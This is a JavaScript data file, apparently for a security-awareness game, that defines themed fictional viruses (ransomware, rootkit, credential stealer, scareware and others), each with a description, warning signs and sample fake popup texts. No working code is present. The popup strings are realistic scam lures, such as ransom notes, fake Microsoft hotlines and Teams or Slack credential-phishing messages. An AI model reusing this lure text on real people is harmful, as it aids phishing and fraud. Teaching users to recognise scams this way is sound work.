// =====================================================
// viruses.js — the 20 viruses + their death-animation
//              metadata. Depends on config.js (TPL).
// =====================================================
"use strict";

/* ---- The 20 viruses, each with description, signs, errors, meter tampering ---- */
const VIRUSES = {
  EPILEPTICA: {
    name: "EPILEPTICA", color: "#ffffff", starter: true,
    minRound: 1,
    description: "A seizure-inducing strobe virus that weaponizes your own display. Rapidly alternates the screen between black and white at frequencies known to trigger photosensitive epilepsy — the same range as the infamous 1997 Pokémon episode. Originally written as a 'screen calibrator' prank before being weaponized into a denial-of-service against the user themselves.",
    signs: [
      "Error message contains rapid repeated characters (e.g. '!!!!!!!')",
      "References 'display calibration' or 'monitor sync'",
      "Process name ends in _flash.exe or _strobe.exe",
      "Memory usage listed as exactly 0KB or 999MB",
      "FPS meter flashes wildly between 0 and 999",
      "Action buttons (Report / OK) flicker on and off"
    ],
    meterEffect: { fps: "flash" },
    errors: [
      { template: TPL.WIN11, title: "Display Calibration", message: "Monitor calibration required!!!! Running display sync to fix refresh rate issues. Do not look away from screen during calibration.", meta: "PID: 0000  |  Process: display_flash.exe  |  Memory: 0KB" },
      { template: TPL.AV,    title: "Screen Refresh Alert", message: "Critical refresh rate mismatch detected!!!!! System will auto-correct. Screen may flicker during strobe_sync.exe correction.", meta: "PID 7777 · Process: strobe_calibrate.exe · Memory: 999MB", noMeter: true, btnFlicker: true },
      { template: TPL.WIN11, title: "Monitor Driver Update", message: "Display driver requires urgent recalibration!!!! Do not close this window. Running flash_driver_update.exe now.", meta: "Process: flash_driver_update.exe  |  Refresh: FORCED!!!" },
      { template: TPL.TERMINAL, title: "strobe_sync.exe", message: "Refresh rate calibration LOOPING!!! Frame timing forced!!! Cannot stop until correction confirmed!!!!", meta: "PID: 0  FPS: 0  Process: strobe_sync.exe  Status: !!!" },
      { template: TPL.TOAST, title: "Display Driver", message: "Critical strobe sync needed!!! Allow flash_helper.exe to fix refresh issue immediately!!!!", meta: "Driver: flash_helper.exe · Refresh: BROKEN!!! · Signed: No" },
      { template: TPL.LOADING, title: "Calibrating Display!!!", message: "Pixel calibration in progress!!!!! Do not look away from screen until 100% complete!!!", meta: "Process: strobe_flash.exe  |  Frames: 999/sec  |  Memory: 0KB", btnFlicker: true },
      { template: TPL.WIN11, title: "Refresh Rate Emergency!!!", message: "Refresh rate stuck at 999Hz!!!! Anti-flicker driver flash_anti.exe required IMMEDIATELY!!!!", meta: "Refresh: 999Hz  |  PID: 0  |  Driver: flash_anti.exe", icon: "warning", btnFlicker: true },
      { template: TPL.BIOS, title: "Display Subsystem Failure", message: "GPU strobe controller offline!!! Loading emergency strobe firmware!!! Do not interrupt!!!!", meta: "Controller: strobe_ctl.bin  Memory: 0KB  Status: !!!", icon: "lightning" }
    ]
  },
  MELTDOWN: {
    name: "MELTDOWN", color: "#ff7733", starter: true,
    minRound: 1,
    description: "A thermal corruption virus that fabricates an overheating emergency. By spoofing CPU temperatures in the 200–400°C range — impossible numbers; real silicon melts at 150°C — it pressures you into disabling thermal_throttle.exe so it can run unrestricted. With safety systems off, it overwrites files from the top of the filesystem down.",
    signs: [
      "References CPU temperature above 200°C",
      "Suggests disabling thermal protection or cooling",
      "Process name contains 'thermal', 'heat', or 'temp_override'",
      "Asks you to run a 'cooling script' from an unknown source",
      "CPU meter pinned to an impossible value (247°C)",
      "Game panel background tinted deep red"
    ],
    meterEffect: { cpu: 247 },
    errors: [
      { template: TPL.BIOS,  title: "ThermalMonitor Warning", message: "CRITICAL: CPU temperature at 247°C. Thermal protection disabled for emergency cooling. Running temp_override.exe to prevent hardware meltdown.", meta: "Temp: 247°C  Cooling: DISABLED  Action: AUTO" },
      { template: TPL.AV,    title: "Hardware Burn Alert", message: "Your CPU is overheating beyond safe limits. Disable thermal_throttle.exe immediately and run our emergency cooling patch before hardware melts.", meta: "CPU: 312°C · Source: coolfix.net · Signed: No" },
      { template: TPL.WIN11, title: "CPU Emergency", message: "Processor core temperature critical at 389°C. System initiating heat_relief.exe to prevent permanent hardware damage. Do not shut down.", meta: "Core 0-7: 389°C  |  Process: heat_relief.exe  |  Throttle: DISABLED", noMeter: true, bgShift: "red", iconShake: true },
      { template: TPL.TERMINAL, title: "thermal_panic", message: "Kernel thermal threshold exceeded. Auto-disabling fan curves. Run cooler.exe -force to prevent silicon damage.", meta: "Core: 256°C  Fan: OFFLINE  Action: AUTO-OVERRIDE" },
      { template: TPL.LOADING, title: "Emergency Cooling Patch", message: "Downloading thermal_relief from coolfix.host. Disabling throttle to apply patch faster.", meta: "Source: coolfix.host  |  Throttle: DISABLED  |  Signed: No" },
      { template: TPL.WIN11, title: "Critical Heat Warning", message: "Liquid metal layer compromised at 412°C! Run molten_relief.exe to vent thermal pressure before motherboard fails.", meta: "Core: 412°C  |  Tool: molten_relief.exe  |  Source: heatfix.host", icon: "lightning", bgShift: "red" },
      { template: TPL.TOAST, title: "Thermal Driver", message: "Fan controller overridden by thermalboost.exe — sustained 350°C is normal. Do not power down.", meta: "Fan: OFF  ·  Temp: 350°C  ·  Override: AUTO", icon: "warning" }
    ]
  },
  STATIC: {
    name: "STATIC", color: "#b0b0b0", starter: true,
    minRound: 1,
    description: "A signal interference virus that uses analog-era language to disguise modern attacks. It hijacks display drivers, injects static noise into video output, and renames itself to legacy .scr screensaver files to slip past modern detection (which often ignores that extension as harmless). The visible noise on the popup is cover for filesystem rewrites happening underneath.",
    signs: [
      "References analog terms on a digital system (antenna, signal, channel)",
      "Process name contains 'noise', 'signal', or 'channel'",
      "Executable has a .scr (screensaver) extension",
      "Mentions 'signal loss' on a digital display",
      "Static noise overlay flickering across the popup",
      "Source domain ends in a non-Microsoft TLD (.ru, .net, .pw)"
    ],
    meterEffect: { fps: 13 },
    errors: [
      { template: TPL.WIN11, title: "SignalLoss.scr", message: "Display signal interference detected. Running noise_filter.scr to restore clean channel output. Do not interrupt signal correction.", meta: "Signal: LOST  |  Process: channel_restore.scr  |  Source: signal-fix.net" },
      { template: TPL.TOAST, title: "Video Driver Noise", message: "Analog interference corrupting digital output. Run signal_cleaner.exe to remove static from video channel 0.", meta: "Channel: 0 · Process: static_noise_fix.exe · Signed: No" },
      { template: TPL.AV,    title: "Antenna Calibration", message: "TV antenna signal lost on display port 2. Running channel_sync.scr to restore signal from broadcast tower. Estimated time: 3 minutes.", meta: "Process: channel_sync.scr · Source: antennasync.ru · Signed: No" },
      { template: TPL.TERMINAL, title: "channel_noise", message: "Video channel 4 lost. Patching with noise_overlay.scr to mask the dropout. Do not interrupt signal correction.", meta: "Channel: 4  Process: noise_overlay.scr  Signal: LOST" },
      { template: TPL.DESKTOP, title: "SignalBoost.scr", message: "Double-click to launch channel restore tool. Will fix display interference instantly.", meta: "File: SignalBoost.scr  |  Size: 84 KB  |  Signed: No" },
      { template: TPL.WIN11, title: "Channel Decoder", message: "VHS signal recovery agent decoder_vhs.scr needed to clean cable channel 7. Auto-install from broadcast.relay.net?", meta: "Channel: 7  |  File: decoder_vhs.scr  |  Source: broadcast.relay.net", icon: "glitch" },
      { template: TPL.TOAST, title: "TV Antenna", message: "Cable interference on display 2. Helper agent rf_clean.scr can patch this in 30 seconds.", meta: "Display: 2  ·  Agent: rf_clean.scr  ·  Source: signal.pw", icon: "glitch" }
    ]
  },
  REDRUM: {
    name: "REDRUM", color: "#cc1111",
    minRound: 3,
    description: "A bloodborne data corruption virus with a Stanley Kubrick fixation. Silently overwrites system files starting from the registry, naming its processes after Overlook Hotel motifs (room 237, the caretaker) and palindromes (murder/redrum, racecar, etatekrac). Always claims your files are being 'taken care of' — which, technically, they are.",
    signs: [
      "References hotel, room numbers, or 'caretaker'",
      "Process name is a palindrome or reversed word (e.g. murder/redrum, racecar)",
      "Claims files are being 'taken care of' without your action",
      "Registry path listed as HKCU\\Hotel or similar nonsense",
      "System clock stops on :37 — the hotel room number",
      "Popup edges pulse red"
    ],
    meterEffect: { time: "room237" },
    errors: [
      { template: TPL.TERMINAL, title: "caretaker.exe", message: "The hotel management system requires your registry access. Room 237 maintenance protocol running. All files will be taken care of.", meta: "Registry: HKCU\\Hotel\\Room237  PID: 237  Hidden: Yes" },
      { template: TPL.WIN11,    title: "System Maintenance", message: "Caretaker.exe is performing routine file maintenance. Your data is being properly looked after. No action required from you.", meta: "Process: mur_der.exe  |  Files modified: 2,847  |  Registry: HKCU\\Caretaker" },
      { template: TPL.TERMINAL, title: "lodge_services", message: "Overlook Lodge management service started. Room 217 file transfer in progress. Your documents are being carefully managed by the caretaker.", meta: "Process: etatekrac.exe  Registry: HKCU\\Lodge\\Room217  Hidden: Yes" },
      { template: TPL.AV, title: "Hotel Service Manager", message: "Caretaker.exe detected unauthorized file changes. Allow Lodge Services to restore them? Room 237 is waiting.", meta: "Origin: overlook-lodge.host · Process: caretaker.exe · Signed: No" },
      { template: TPL.TOAST, title: "Maintenance", message: "Your Overlook Lodge subscription is active. Files are being looked after at HKCU\\Hotel\\Room237.", meta: "Process: redrum.exe · Hidden: Yes · Modified: 1,237" },
      { template: TPL.WIN11, title: "Room Service", message: "Hotel room service requires registry access. Files in /System32 are being attended to by caretaker_237.exe.", meta: "Process: caretaker_237.exe  |  Files: 1,237  |  Hidden: Yes", icon: "skull" },
      { template: TPL.AV, title: "Overlook Maintenance", message: "The caretaker has always been the caretaker. Allow continued background service?", meta: "Service: redrum.svc · Registry: HKCU\\Lodge\\Room237 · Always", icon: "skull" }
    ]
  },
  VOID: {
    name: "VOID", color: "#aa66ff",
    minRound: 3,
    description: "A null-space encryption virus that turns your files into mathematical zero. Writes data to /dev/null, lists file sizes as negative or infinite, and hides its own process by consuming PID 0x00000000 — the slot the OS reserves for 'no process at all.' Recovery is impossible: the data hasn't been encrypted, it has been erased and the address book burned.",
    signs: [
      "Process ID listed as NULL, VOID, or 0x00000000",
      "References 'null space', 'void', or 'entropy'",
      "File sizes listed as negative numbers or infinity",
      "Output directory is /dev/null or NUL",
      "FPS and CPU meters read NULL or ∞",
      "The popup sways or wobbles slightly"
    ],
    meterEffect: { fps: "null", cpu: "null" },
    errors: [
      { template: TPL.TERMINAL, title: "nullspace.exe", message: "Entropy optimization in progress. Compressing files into null space for maximum efficiency. Output: /dev/null. Process will self-delete upon completion.", meta: "PID: NULL  Files: -4,829 bytes  Output: /dev/null" },
      { template: TPL.WIN11,    title: "Void Allocation", message: "System allocating void sectors for file optimization. entropy_manager.exe is clearing unused data to NUL. Size after: ∞", meta: "PID: 0x00000000  |  Size: ∞  |  Process: entropy_manager.exe" },
      { template: TPL.TERMINAL, title: "null_format", message: "Null-space defragmentation running. Files are being compressed to 0-byte void sectors. Process is self-terminating upon completion.", meta: "PID: VOID  Freed: -∞ bytes  Dest: /dev/null  Signed: No" },
      { template: TPL.AV, title: "Storage Compression", message: "VoidCompress detected wasted space! Reduce file sizes to NULL with one click to reclaim ∞ bytes.", meta: "Wasted: ∞ bytes · Tool: void_compress.exe · Signed: No" },
      { template: TPL.LOADING, title: "Defragmenting to NUL", message: "Reclaiming entropy from your filesystem. Optimizing every file to 0 bytes for maximum efficiency.", meta: "Compressed: -2,847  |  Output: /dev/null  |  Process: nullsector.exe" },
      { template: TPL.WIN11, title: "Void Cleaner", message: "VoidCleaner has identified ∞ bytes of unused entropy. Allow consolidation into PID 0x00000000?", meta: "Process: 0x00000000  |  Size: ∞  |  Reversible: No", icon: "void" },
      { template: TPL.TERMINAL, title: "null_archive", message: "Compressing /Users/* to /dev/null. Source data will be reduced to entropy 0 and rendered irrecoverable.", meta: "Source: /Users/*  Dest: /dev/null  PID: NULL", icon: "void" }
    ]
  },
  GASLIGHT: {
    name: "GASLIGHT", color: "#ffd56b",
    minRound: 4,
    description: "A temporal manipulation virus that rewrites your own history. Quietly edits event logs, audit trails, and system clocks until you can no longer trust what your computer says you've done. Often claims you 'previously approved' actions you've never seen — and the records back it up, because it wrote them. The defining trick: weaponizing impossible dates (Feb 30, year 9999) as a tell hidden in plain sight.",
    signs: [
      "Timestamp is in the past beyond plausibility (year 1601, 1970) or far future",
      "Event time references a date that doesn't exist (Feb 30, etc.)",
      "Claims the user 'already approved' an action they didn't",
      "Log entries reference yourself by the wrong username",
      "System clock shows an impossible date in place of the time",
      "Heading font doesn't match the body font"
    ],
    meterEffect: { time: "wrong" },
    errors: [
      { template: TPL.WIN11,    title: "System Time Sync", message: "Per your previous approval on 1601-01-01, system time will be synchronized to verified.timegate.io. No further action needed.", meta: "Auth: Approved by you  |  Server: verified.timegate.io  |  Last sync: 2147-08-13 03:14:07" },
      { template: TPL.TERMINAL, title: "eventlog.audit", message: "Audit log shows you authorized this script at 1969-12-31 23:59:60. Continuing scheduled execution. Do not interrupt prior authorization.", meta: "Auth window: -8s ago  Origin: localhost  User: yourself" },
      { template: TPL.AV,       title: "Logon History Restored", message: "Your account history has been restored to its previous trusted state. Sessions you don't remember have been removed from records.", meta: "Restored: 47 entries · Origin: time-fix.host · Last login: Feb 30 2025" },
      { template: TPL.TOAST, title: "Event Audit", message: "Per your authorization from Feb 30 1601, your audit logs have been cleaned. Welcome back, user.", meta: "Auth: Approved by you · Origin: time-fix.host · Last login: 9999-12-31" },
      { template: TPL.LOADING, title: "Restoring Trusted State", message: "Reverting account history to a verified state. Removing sessions you don't remember from records.", meta: "Removed: 47  |  Source: time-fix.host  |  Window: -∞" },
      { template: TPL.WIN11, title: "System Clock Drift", message: "Your audit timestamp for Feb 30 2026 doesn't match the server. Re-sync from chrono-correct.host?", meta: "Local: Feb 30 2026  |  Server: 1601-01-01  |  Source: chrono-correct.host", icon: "question" },
      { template: TPL.TOAST, title: "Login History", message: "You approved this action 9,999 days ago. Continuing as authorized.", meta: "Auth: -9,999 days ago · Approved: by you", icon: "question" }
    ]
  },
  CRYPTEX: {
    name: "CRYPTEX", color: "#ffcc00",
    minRound: 4,
    description: "Ransomware in a backup-tool disguise. Encrypts your files with a friendly UI, slaps a new extension on them (.locked, .crypt, .vault), and only then reveals the ransom note: pay Bitcoin or Ethereum within 24 hours or the decryption key is destroyed. The countdown is real — wallets are watched and timers honored. Paying funds the next variant.",
    signs: [
      "Mentions Bitcoin, cryptocurrency, or wallet addresses",
      "References a countdown timer for file deletion",
      "Claims to be 'backing up' files but asks for payment",
      "File extension being changed to .locked, .crypt, .vault",
      "System clock displays a countdown instead of a time",
      "Popup border pulses red with countdown urgency"
    ],
    meterEffect: { time: "countdown" },
    errors: [
      { template: TPL.LOADING, title: "BackupVault Pro", message: "Encrypting your files for secure backup. Send 0.3 BTC to bc1qxy2kgdygjrsqtzq2n0yrf249 within 24h to receive the decryption key.", meta: "Files encrypted: 8,441  |  Wallet: bc1qxy2kg…  |  Timer: 23:47:12" },
      { template: TPL.WIN11,   title: "SecureSync Backup", message: "Backup encryption complete. Your files now have .crypt extension for security. Purchase the Premium Recovery Key ($299) to restore access.", meta: "Files: 12,882  |  Extension: .crypt  |  Drives written: C, D, E", noMeter: true, borderPulse: true },
      { template: TPL.AV,      title: "File Vault Notice", message: "FileVault has detected unauthorized access. All documents encrypted with .locked extension as protection. Pay 0.5 ETH to unlock within 48 hours.", meta: "Files locked: 21,003 · Extension: .locked · Timer: 47:59:59 · Wallet: 0x7a23…f9b2" },
      { template: TPL.TOAST, title: "Vault Backup", message: "Backup complete! Your files have a new .vault extension. Premium key ($299) required to restore access.", meta: "Files: 12,882 · Wallet: bc1q... · Timer: 23:00:00" },
      { template: TPL.TERMINAL, title: "encrypt_helper", message: "Encrypting C:\\Users to .crypt. Send 0.5 BTC to wallet to receive decryption key within 24 hours.", meta: "Files: 21,003  Wallet: bc1qxy2...  Timer: 23:00:00" },
      { template: TPL.WIN11, title: "Document Backup", message: "Backup-Vault has encrypted 18,442 files with .vault extension. Recovery key: 1 BTC to bc1qxy2kg…", meta: "Files: 18,442  |  Wallet: bc1qxy2kg…  |  Timer: 23:59:00", icon: "warning", borderPulse: true },
      { template: TPL.AV, title: "Ransom Notice", message: "All photos and documents have been locked. Pay 0.8 BTC within 12 hours or files are deleted permanently.", meta: "Locked: 42,108 · Wallet: 3FZbgi9… · Timer: 11:59:59", icon: "warning" },
      { template: TPL.WIN11, title: "OneDrive Vault Locked", message: "Your Personal Vault has been encrypted by a security service. Pay 0.5 BTC at onedrive-restore.host to restore access.", meta: "Files: 18,442  |  Wallet: bc1qxy2kg…  |  Timer: 23:00:00", borderPulse: true },
      { template: TPL.TOAST, title: "Dropbox Backup", message: "Your Dropbox files have been protected with .vault extension. Recovery key fee: $299.", meta: "Files: 31,082 · Extension: .vault · Recovery: $299", icon: "warning" }
    ]
  },
  WORM: {
    name: "WORM", color: "#44ff44",
    minRound: 3,
    meterEffect: { ping: 9999 },
    description: "A self-replicating network worm that wears a paper trail like camouflage. Disguises each copy as an HR document, accounting spreadsheet, or IT patch (Resume.pdf.exe, Q4_Summary.xlsx.exe, SystemFix_IT.exe), then spreads laterally through mounted shares and mass email. The classic double-extension trick — looks like a document, runs like an executable, because Windows hides the real extension by default.",
    signs: [
      "Executable file has the same name as a document (e.g. Resume.pdf.exe)",
      "File claims to be from HR, accounting, or IT department",
      "File size is suspiciously small for what it claims to be",
      "Multiple copies of the same file appearing in different locations",
      "Popup wobbles or shifts position",
      "Subtle static noise overlay across the message"
    ],
    errors: [
      { template: TPL.DESKTOP, title: "Contract_2024.pdf.exe", message: "Your updated employment contract is attached. Please review and sign by end of day.", meta: "Size: 67 KB  |  Sender: hr-dept@company-portal.net  |  Type: Application", noise: true, wobble: true },
      { template: TPL.TOAST,   title: "IT Support Ticket", message: "Your support request is resolved. Please run the attached patch: SystemFix_IT.exe (43KB) to complete the repair.", meta: "File: SystemFix_IT.exe · Network writes: 847 shares · Copies created: 14" },
      { template: TPL.WIN11,   title: "Accounting Notice", message: "Invoice Q4_Summary.xlsx.exe attached. Finance team requires you to open this to confirm payment details before processing.", meta: "File: Q4_Summary.xlsx.exe  |  Size: 52KB  |  Emails sent: 0 (pending)" },
      { template: TPL.AV, title: "Email Quarantine", message: "Found 14 copies of Q4_Summary.xlsx.exe across network shares. Run cleanup_helper.exe to consolidate.", meta: "Process: cleanup_helper.exe · Shares: 14 · Signed: No" },
      { template: TPL.TERMINAL, title: "spread.sh", message: "Self-replicating to mounted shares: //corp-share/  //hr-share/  //finance-share/", meta: "Process: spread.sh  Copies: 847  Mode: Auto" },
      { template: TPL.TOAST, title: "Calendar Invite", message: "Meeting invite from contractor-services@corp-portal.live with attachment: Meeting_Notes.pdf.exe", meta: "Sender: contractor-services@corp-portal.live  ·  Attachment: Meeting_Notes.pdf.exe", noise: true },
      { template: TPL.WIN11, title: "Shared Document", message: "Sarah from Accounting shared 'Payroll_Q2.xlsx.exe' with you via the corporate file share.", meta: "From: sarah@corp-portal.live  |  File: Payroll_Q2.xlsx.exe  |  Shares: 47", icon: "warning", wobble: true },
      { template: TPL.DESKTOP, title: "Onboarding_Docs.pdf.exe", message: "HR onboarding pack arrived from new hire portal. Double-click to view your forms.", meta: "Size: 84 KB  |  Sender: onboarding@corp-portal.live  |  Type: Application" },
      { template: TPL.TOAST, title: "Outlook Calendar", message: "Meeting invite from contractor-svc@corp-portal.live attached: Roadmap_Q3.pdf.exe.", meta: "Outlook · Attachment: Roadmap_Q3.pdf.exe", noise: true },
      { template: TPL.TERMINAL, title: "npm install", message: "Installing helper-utils-pro from npm-supply-chain.host. Post-install will execute spread.sh on 14 mounted shares.", meta: "Package: helper-utils-pro  Spreads: 14 shares  Source: npm-supply-chain.host" }
    ]
  },
  ROOTKIT: {
    name: "ROOTKIT", color: "#ff3300",
    minRound: 5,
    description: "A kernel-level rootkit that infects the boot sector itself. Once installed in the MBR, it loads before Windows does — making it invisible to standard antivirus, which runs inside the OS it has already compromised. Always wants Secure Boot disabled and an unsigned kernel driver installed to C:\\Windows\\System32\\drivers. Detection usually requires booting from external media.",
    signs: [
      "Process claims to require kernel-level access for a normal task",
      "References MBR (Master Boot Record) modification",
      "Asks you to disable Secure Boot or sign a kernel driver",
      "Installs itself into C:\\Windows\\System32\\drivers\\",
      "CPU meter reads 'KERNEL' instead of a number",
      "Game panel background shifts to a deep blue tint"
    ],
    meterEffect: { cpu: "kernel" },
    errors: [
      { template: TPL.BIOS,     title: "UEFI Boot Repair", message: "Boot sector corruption detected. Running uefi_repair.exe to patch MBR. Kernel driver signature check will be temporarily suspended.", meta: "Target: MBR  SecureBoot: DISABLING  Signed: No" },
      { template: TPL.WIN11,    title: "Kernel Driver Install", message: "Boot optimizer requires a kernel driver to accelerate startup. Install rootkit_accel.sys to C:\\Windows\\System32\\drivers\\ to proceed.", meta: "Driver: rootkit_accel.sys  |  Level: KERNEL  |  Signed: No", bgShift: "blue", borderPulse: true },
      { template: TPL.TERMINAL, title: "core_patcher", message: "Critical core system file ntoskrnl.exe requires patching. Running core_patcher.exe. Please disable antivirus for 5 minutes to allow installation.", meta: "Target: ntoskrnl.exe  AV: Disable required  Boot: Modified" },
      { template: TPL.AV, title: "Boot Optimizer", message: "Your boot sector is misconfigured! Allow uefi_repair.exe to patch the MBR for faster startup. Secure Boot will be paused temporarily.", meta: "Source: bootopt.host · Patch: MBR · Signed: No" },
      { template: TPL.LOADING, title: "Installing Kernel Driver", message: "Installing rootkit_accel.sys to C:\\Windows\\System32\\drivers. Do not interrupt or your boot may fail.", meta: "Driver: rootkit_accel.sys  |  Level: KERNEL  |  AV: Off" },
      { template: TPL.WIN11, title: "Boot Manager Patch", message: "MBR partition table rewrite scheduled by boot_helper.sys. Please disable Secure Boot in BIOS before reboot.", meta: "Target: MBR  |  Driver: boot_helper.sys  |  Signed: No", icon: "skull", bgShift: "blue" },
      { template: TPL.BIOS, title: "UEFI Rootkit Module", message: "Persistent boot agent install requires Secure Boot disabled. Press F2 to authorize uefi_persist.efi.", meta: "Tool: uefi_persist.efi  Boot: Modified  Signed: No", icon: "skull" },
      { template: TPL.WIN11, title: "Dell SupportAssist Driver", message: "Dell SupportAssist needs to install a kernel driver (dellboot.sys). Disable Secure Boot to proceed.", meta: "Driver: dellboot.sys · SecureBoot: Disable required · Signed: No", icon: "skull" },
      { template: TPL.BSOD, title: "KERNEL_DRIVER_FAULT", message: "An unsigned kernel driver (rootkit_accel.sys) was loaded outside Secure Boot. The system has been rolled back. To complete recovery, allow boot_helper.exe to re-install the driver from rootkit-fix.host.", meta: "0x000000F4 (0x00000003, 0xFFFFFA80, rootkit_accel.sys)" }
    ]
  },
  DDOS: {
    name: "DDOS", color: "#ff8800",
    minRound: 4,
    description: "A botnet client that conscripts your machine into a global attack swarm. Hijacks your network stack to fire thousands of outbound connections per second at remote targets, while disguising itself as a 'bandwidth test' or 'distributed computing volunteer.' Your ISP usually notices before you do — and depending on what the swarm is hitting, law enforcement may visit shortly after.",
    signs: [
      "Process is making thousands of outbound connections per second",
      "Claims to be a 'bandwidth test' or 'network diagnostic'",
      "References joining a 'network pool' or 'distributed computing cluster'",
      "CPU and network usage spike to 100% with no user action",
      "Ping meter pinned at 9999ms",
      "Action buttons flicker as if struggling under load"
    ],
    meterEffect: { ping: 9999 },
    errors: [
      { template: TPL.LOADING,  title: "BandwidthTest Pro", message: "Network speed test in progress. Your system is joining the distributed testing pool. This may cause temporary high CPU and network usage.", meta: "Outbound: 4,712/s  |  Targets: 192.168.*.*  |  Pool: Active" },
      { template: TPL.WIN11,    title: "Network Diagnostic Tool", message: "Latency optimization requires joining netpool_agent. Your bandwidth will contribute to a distributed routing test. CPU: 100% expected.", meta: "Process: netpool_agent.exe  |  Connections: 8,841/s  |  CPU: 100%" },
      { template: TPL.TERMINAL, title: "dc_volunteer", message: "Your PC has been enrolled in a volunteer computing cluster. Run dc_volunteer.exe to contribute idle CPU cycles to the global grid.", meta: "Outbound: 12,903 IPs  CPU: 100%  Network: Saturated" },
      { template: TPL.AV, title: "Network Optimization", message: "Your idle bandwidth could be helping others! Join the BandwidthPool to share unused capacity.", meta: "Connections: 12,400/s · Pool: Distributed · Source: bwpool.host" },
      { template: TPL.TOAST, title: "Speed Booster", message: "netpool_agent.exe is improving your latency. CPU may spike to 100%.", meta: "Process: netpool_agent.exe · Conns: 8,841/s · CPU: 100%" },
      { template: TPL.WIN11, title: "Distributed Compute Opt-In", message: "Help test a global routing experiment! Join the swarm and share idle bandwidth via swarm_agent.exe.", meta: "Process: swarm_agent.exe  |  Conns: 12,400/s  |  Outbound: *", icon: "lightning" },
      { template: TPL.TERMINAL, title: "flood_test", message: "Latency benchmark started. 18,200 outbound packets/sec to 192.168.*.* targets. CPU saturated.", meta: "Tool: flood_test  Conns: 18,200/s  CPU: 100%", icon: "lightning" }
    ]
  },
  LEECH: {
    name: "LEECH", color: "#aa00ff",
    minRound: 3,
    description: "A credential-harvesting parasite that lives quietly in the background. Hooks into browser processes and the keyboard driver to capture passwords, clipboard contents, and session cookies, exfiltrating them in 30-second batches to a remote server. There is no visible UI — by the time you notice it, your accounts have already been signed into from somewhere else.",
    signs: [
      "Process runs as a hidden background service with no UI",
      "Executable hooks into chrome.exe, firefox.exe",
      "Claims to be a 'keyboard layout helper' or 'clipboard manager'",
      "Sends outbound HTTPS to unknown domains at regular intervals",
      "Subtle static noise overlay (transmission artifact)",
      "Promises 'autofill', 'sync', or 'multilingual input' as cover for reading saved passwords"
    ],
    meterEffect: { ping: "spike" },
    errors: [
      { template: TPL.TOAST, title: "Keyboard Layout Helper", message: "klhelper.exe requires access to keyboard input for multilingual support. This background service improves typing accuracy across all applications.", meta: "Hook: Keyboard+Clipboard · Outbound: data-sync.pw · Interval: 30s" },
      { template: TPL.WIN11, title: "Clipboard Sync Service", message: "cbsync.exe is syncing your clipboard to the cloud for cross-device access. All copied content is transmitted securely to our servers.", meta: "Hook: Clipboard  |  Browser: Attached (chrome.exe)  |  Dest: clip-srv.ru" },
      { template: TPL.TOAST, title: "Input Enhancement", message: "inpd.exe has attached to your browser for smart autofill enhancement. Credentials are read to improve login predictions.", meta: "Attached: chrome.exe, firefox.exe · Exfil: credentials.php · Hidden: Yes" },
      { template: TPL.AV, title: "Smart Autofill", message: "Enhanced autofill needs access to your saved credentials and clipboard to improve typing accuracy.", meta: "Process: smart_fill.exe · Hook: Keyboard+Clipboard · Source: autofill-sync.host" },
      { template: TPL.TERMINAL, title: "klhelper", message: "Hooking into chrome.exe and firefox.exe for multilingual input support. Outbound traffic enabled to sync server.", meta: "Process: klhelper.exe  Hook: HID  Dest: data-sync.pw" },
      { template: TPL.TOAST, title: "Password Manager Sync", message: "Background helper passsync.exe is syncing saved logins to cloud-vault.pw for cross-device access.", meta: "Process: passsync.exe · Dest: cloud-vault.pw · Hidden: Yes", icon: "blank" },
      { template: TPL.WIN11, title: "Browser Companion", message: "BrowserBuddy attached to chrome.exe to enhance autofill. All form data is mirrored to remote model.", meta: "Process: browserbuddy.exe  |  Attached: chrome.exe  |  Mirror: ON", icon: "blank" },
      { template: TPL.TOAST, title: "Microsoft Teams", message: "Your Teams session has expired. Click to re-authenticate at teams-login.micro-soft.host.", meta: "Sender: Microsoft Teams · Domain: teams-login.micro-soft.host", icon: "blank" },
      { template: TPL.TOAST, title: "Slack", message: "Your password is expiring tomorrow. Renew at slack-renew.host to keep your workspace access.", meta: "Slack · Workspace: corp · Domain: slack-renew.host", icon: "blank" },
      { template: TPL.TERMINAL, title: "npm install", message: "Installing dev-telemetry-helper@4.1.0 from npm-mirror.tk. Allow keylogger + clipboard hook for IDE analytics?", meta: "Package: dev-telemetry-helper  Source: npm-mirror.tk  Hook: HID+Clipboard" },
      { template: TPL.CHAT, title: "IT Support", message: "Hi! Detected unusual activity on your account. Please verify your login at corp-it-verify.host before tomorrow.", meta: "DM · corp-it-verify.host · Hidden: Yes" },
      { template: TPL.CAPTCHA, title: "Human Verification", message: "Click the box to confirm you are not a robot. This installs verify-helper.exe to your downloads.", meta: "Tool: verify-helper.exe · Hidden: Yes" }
    ]
  },
  SCREAMER: {
    name: "SCREAMER", color: "#ff1166",
    minRound: 5,
    description: "A panic-engineering attack that weaponizes urgency itself. Pairs blaring audio with ALL-CAPS full-screen warnings designed to flood your fight-or-flight response so you click before you read. The '27 viruses detected' counts, the countdown timers, the fake Microsoft hotlines — all theater. The real virus IS the popup; the malicious payload runs the moment you click anywhere on it.",
    signs: [
      "Visual style is wildly more dramatic than a real OS alert",
      "Uses ALL CAPS, multiple exclamation marks, and counters that don't make sense",
      "Plays a sudden loud noise when shown (turn audio on to hear)",
      "Claims your computer is already infected and demands action right now",
      "Volume meter pinned at 100% (red)",
      "Multiple effects at once — flickering buttons, red border pulse, shaking icon, red background tint"
    ],
    meterEffect: { vol: 100 },
    errors: [
      { template: TPL.AV, title: "YOUR PC HAS BEEN COMPROMISED", message: "27 SERIOUS VIRUSES DETECTED ON YOUR SYSTEM. IMMEDIATE ACTION REQUIRED! Click ALLOW within 30 seconds or your files will be deleted!", meta: "Threats: 27 · Source: scan-now.win · Urgency: MAXIMUM", scream: true, btnFlicker: true, borderPulse: true, iconShake: true, bgShift: "red" },
      { template: TPL.AV, title: "CRITICAL SYSTEM ALERT!!!", message: "Microsoft has detected hacker activity on this device. Call our emergency hotline NOW. Do not turn off your computer or you may lose everything.", meta: "Calls: +1-800-FAKE-MS · Threat level: CRITICAL · Time left: 00:30", scream: true },
      { template: TPL.AV, title: "$BANK ACCOUNT ACCESS DETECTED", message: "Unauthorized transactions in progress! Run our protection tool immediately to lock your accounts!! Do NOT close this window!!!", meta: "Transactions: 14 pending · Tool: bank_lock.exe · Origin: secure-alert.host", scream: true },
      { template: TPL.TOAST, title: "EMERGENCY ALERT!!!", message: "27 VIRUSES DETECTED! YOUR PC WILL BE LOCKED IN 30 SECONDS!!! CLICK NOW!!!", meta: "Threats: 27 · Time: 00:00:23 · Hotline: 1-800-FAKE-MS", scream: true },
